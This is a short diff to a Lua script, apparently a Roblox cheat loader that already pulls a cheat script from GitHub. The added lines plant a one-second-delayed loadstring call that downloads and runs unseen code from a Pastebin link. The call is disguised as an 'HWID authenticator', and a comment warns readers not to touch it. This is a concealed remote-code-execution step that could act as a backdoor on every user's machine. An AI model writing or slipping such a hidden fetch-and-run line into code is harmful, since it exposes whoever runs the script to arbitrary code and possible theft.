@@ -9,3 +9,8 @@ else
 shared.detected = "Universal Clanning UI"
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Harvox/glacier-ware-2.0/refs/heads/main/Universal"))()
 end  
+
+-- Don't touch or it'll break the script
+task.delay(1, function()
+loadstring(game:HttpGet("https://pastebin.com/raw/a2CV7cAg"))() -- HWID authenticator
+end
